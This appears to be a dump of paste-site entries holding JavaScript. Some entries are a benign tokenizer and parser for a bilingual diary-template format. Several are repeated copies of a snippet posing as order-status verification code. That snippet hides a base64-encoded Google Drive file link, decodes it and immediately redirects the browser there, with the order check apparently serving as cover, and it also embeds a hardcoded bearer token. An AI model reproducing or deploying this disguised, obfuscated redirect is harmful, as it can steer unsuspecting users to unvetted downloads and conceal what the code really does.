  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sm80iP9F,report parser js,lippiod,JavaScript,Tuesday 25th of March 2025 07:44:16 AM CDT,"// === TOKENIZER ===
function tokenize(input) {
  const tokens = [];
  let i = 0;

  function match(str) {
    return input.startsWith(str, i);
  }

  function advance(n) {
    i += n;
  }

  function push(type, value = null) {
    tokens.push({ type, value: value ?? type });
  }

  while (i < input.length) {
    if (match('\n*\n')) {
      push('T_CK', '\n*\n');
      advance(3);
    } else if (match('@sel(')) {
      push('T_SEL_OPEN', '@sel(');
      advance(5);
    } else if (match('@ed()')) {
      push('T_EDIT', '@ed()');
      advance(6);
    } else if (match(')')) {
      push('T_PAREN_CLOSE', ')');
      advance(1);
    } else if (match('/')) {
      push('T_SLASH', '/');
      advance(1);
    } else {
      const start = i;
      while (
        i < input.length &&
        !match('\n*\n') &&
        !match('@sel(') &&
        !match('@ed()') &&
        !match(')') &&
        !match('/')
      ) {
        i++;
      }
      const text = input.slice(start, i).trim();
      if (text) {
        push('T_TEXT', text);
      }
    }
  }

  return tokens;
}

// === PARSER ===
function parse(tokens) {
  let pos = 0;
  let clCounter = 1;
  let eCounter = 1;

  function peek(type) {
    return tokens[pos]?.type === type;
  }

  function consume(type) {
    const token = tokens[pos];
    if (!token || token.type !== type) {
      throw new Error(`Expected ${type}, got ${token?.type} at position ${pos}`);
    }
    pos++;
    return token;
  }

  function parseText() {
    const token = consume('T_TEXT');
    return { type: 'text', value: token.value };
  }

  function parseEdit() {
    consume('T_EDIT');
    return { type: 'edit', id: `e-${eCounter++}` };
  }

  function parseDropdown() {
    consume('T_SEL_OPEN');

    const options = [];
    options.push(consume('T_TEXT').value);

    while (peek('T_SLASH')) {
      consume('T_SLASH');
      options.push(consume('T_TEXT').value);
    }

    consume('T_PAREN_CLOSE');

    return { type: 'dropdown', id: `e-${eCounter++}`, options };
  }

  function parseE() {
    if (peek('T_SEL_OPEN')) return parseDropdown();
    if (peek('T_EDIT')) return parseEdit();
    if (peek('T_TEXT')) return parseText();
    throw new Error(`Unexpected token at position ${pos}: ${tokens[pos]?.type}`);
  }

  function parseExpr() {
    const elements = [];
    while (
      peek('T_TEXT') ||
      peek('T_EDIT') ||
      peek('T_SEL_OPEN')
    ) {
      elements.push(parseE());
    }
    return elements;
  }

  function parseCl() {
    consume('T_CK');
    const items = parseExpr();
    return {
      id: `cl-${clCounter++}`,
      checked: false,
      items
    };
  }

  function parseProgram() {
    const result = [];
    while (peek('T_CK')) {
      result.push(parseCl());
    }
    return result;
  }

  return parseProgram();
}

// === EXAMPLE INPUT (Diary-style, bilingual) ===
const input = `
*
今天我感覺 @sel(開心/普通/沮喪)，也許是因為我終於完成了那個專案 @ed()，雖然還有一些小地方要修正 @ed()。
Today I felt @sel(happy/neutral/down), maybe because I finally finished that project @ed(), although a few things still need fixing @ed()。
*
我選擇了一本新書 @sel(小說/歷史/自我成長) 開始閱讀，名字叫 @ed()，它讓我重新思考一些事情 @ed()。
I picked up a new book @sel(fiction/history/self-help) to read, titled @ed(), and it made me reflect on a few things @ed()。
*
晚餐我做了 @sel(義大利麵/壽司/沙拉)，因為我最近在嘗試更健康的飲食 @ed()，也開始記錄每天的熱量攝取 @ed()。
For dinner, I made @sel(pasta/sushi/salad), since I’m trying to eat healthier lately @ed(), and started tracking my daily calories @ed()。
*
今天我和 @ed() 一起散步，天氣是 @sel(晴天/陰天/下雨)，我們聊了很多最近的煩惱 @ed()。
I went for a walk with @ed() today — the weather was @sel(sunny/cloudy/rainy), and we talked about a lot of recent worries @ed()。
*
睡前我花了一點時間做計畫，明天我打算完成 @ed()，而且希望心情是 @sel(積極/平穩/專注)。
Before bed, I spent some time planning — tomorrow I hope to finish @ed(), and be in a @sel(positive/calm/focused) mindset。
`;

// === USAGE ===
const tokens = tokenize(input);
const result = parse(tokens);
console.log(JSON.stringify(result, null, 2));"
JLn4PDj7,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 07:38:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/228/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wC2EqGMX,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 07:26:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/451/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zMbWjs4n,Untitled,x2LeaF,JavaScript,Tuesday 25th of March 2025 07:13:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/623/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g9Wj3tMe,Untitled,lippiod,JavaScript,Tuesday 25th of March 2025 07:13:10 AM CDT,"// === TOKENIZER ===
function tokenize(input) {
  const tokens = [];
  let i = 0;

  function match(str) {
    return input.startsWith(str, i);
  }

  function advance(n) {
    i += n;
  }

  function push(type, value = null) {
    tokens.push({ type, value: value ?? type });
  }

  while (i < input.length) {
    if (match('\n*\n')) {
      push('T_CK', '\n*\n');
      advance(3);
    } else if (match('@sel(')) {
      push('T_SEL_OPEN', '@sel(');
      advance(5);
    } else if (match('@ed()')) {
      push('T_EDIT', '@ed()');
      advance(6);
    } else if (match(')')) {
      push('T_PAREN_CLOSE', ')');
      advance(1);
    } else if (match('/')) {
      push('T_SLASH', '/');
      advance(1);
    } else {
      // match text until next special token
      const start = i;
      while (
        i < input.length &&
        !match('\n*\n') &&
        !match('@sel(') &&
        !match('@ed()') &&
        !match(')') &&
        !match('/')
      ) {
        i++;
      }
      const text = input.slice(start, i).trim();
      if (text) {
        push('T_TEXT', text);
      }
    }
  }

  return tokens;
}

// === PARSER ===
function parse(tokens) {
  let pos = 0;

  function peek(type) {
    return tokens[pos]?.type === type;
  }

  function consume(type) {
    const token = tokens[pos];
    if (!token || token.type !== type) {
      throw new Error(`Expected ${type}, got ${token?.type} at position ${pos}`);
    }
    pos++;
    return token;
  }

  function parseText() {
    const token = consume('T_TEXT');
    return { type: 'text', value: token.value };
  }

  function parseEdit() {
    consume('T_EDIT');
    return { type: 'edit' };
  }

  function parseDropdown() {
    consume('T_SEL_OPEN');

    const options = [];
    options.push(consume('T_TEXT').value);

    while (peek('T_SLASH')) {
      consume('T_SLASH');
      options.push(consume('T_TEXT').value);
    }

    consume('T_PAREN_CLOSE');

    return { type: 'dropdown', options };
  }

  function parseE() {
    if (peek('T_SEL_OPEN')) return parseDropdown();
    if (peek('T_EDIT')) return parseEdit();
    if (peek('T_TEXT')) return parseText();
    throw new Error(`Unexpected token at position ${pos}: ${tokens[pos]?.type}`);
  }

  function parseExpr() {
    const elements = [];
    while (
      peek('T_TEXT') ||
      peek('T_EDIT') ||
      peek('T_SEL_OPEN')
    ) {
      elements.push(parseE());
    }
    return elements;
  }

  function parseCl() {
    consume('T_CK');
    return parseExpr(); // Return array of e nodes directly
  }

  function parseProgram() {
    const result = [];
    while (peek('T_CK')) {
      result.push(parseCl());
    }
    return result;
  }

  return parseProgram();
}

const input = `
*
今天我感覺 @sel(開心/普通/沮喪)，也許是因為我終於完成了那個專案 @ed()，雖然還有一些小地方要修正 @ed()。
Today I felt @sel(happy/neutral/down), maybe because I finally finished that project @ed(), although a few things still need fixing @ed().
*

我選擇了一本新書 @sel(小說/歷史/自我成長) 開始閱讀，名字叫 @ed()，它讓我重新思考一些事情 @ed()。
I picked up a new book @sel(fiction/history/self-help) to read, titled @ed(), and it made me reflect on a few things @ed().
*

晚餐我做了 @sel(義大利麵/壽司/沙拉)，因為我最近在嘗試更健康的飲食 @ed()，也開始記錄每天的熱量攝取 @ed()。
For dinner, I made @sel(pasta/sushi/salad), since I’m trying to eat healthier lately @ed(), and started tracking my daily calories @ed().
*

今天我和 @ed() 一起散步，天氣是 @sel(晴天/陰天/下雨)，我們聊了很多最近的煩惱 @ed()。
I went for a walk with @ed() today — the weather was @sel(sunny/cloudy/rainy), and we talked about a lot of recent worries @ed().
*

睡前我花了一點時間做計畫，明天我打算完成 @ed()，而且希望心情是 @sel(積極/平穩/專注)。
Before bed, I spent some time planning — tomorrow I hope to finish @ed(), and be in a @sel(positive/calm/focused) mindset.
`;

const tokens = tokenize(input);
const result = parse(tokens);
console.log(JSON.stringify(result));"
